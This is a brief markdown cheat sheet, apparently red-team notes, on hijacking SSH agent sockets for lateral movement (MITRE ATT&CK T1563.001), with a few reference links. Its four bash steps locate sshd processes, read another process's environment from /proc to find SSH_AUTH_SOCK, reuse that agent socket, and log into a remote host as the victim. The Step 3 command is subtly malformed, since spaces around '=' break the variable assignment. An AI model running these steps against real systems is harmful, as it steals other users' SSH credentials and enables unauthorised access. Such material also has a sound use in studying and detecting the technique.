# Using MITRE ATT&CK
[MITRE ATT&CK Framework](https://attack.mitre.org/techniques/T1563/001/)


# Manually
##### Step 1 - Determine SSH Process ID (PID)
```bash
ps aux | grep sshd
```
##### Step 2 - Determine SSH_AUTH_SOCK environment variable
```bash
grep SSH_AUTH_SOCK /proc/<PID>/environ
```
##### Step 3 - Hijack target's ssh-agent socket
```bash
SSH_AUTH_SOCK = /tmp/ssh-XXXXXXX/agent.XXXX ssh-add -l
```
##### Step 4 - Log into remote system
```bash
ssh remotesystem -l victim
```

# References
[Public Key Authentication](https://www.ssh.com/academy/ssh/public-key-authentication)

[Unix domain socket](https://en.wikipedia.org/wiki/Unix_domain_socket)

[SSH and ssh-agent](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=dfe66853-a519-4b96-81b6-e7cbbdfc8c53&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)

[SSH Hijacking for lateral movement](https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/)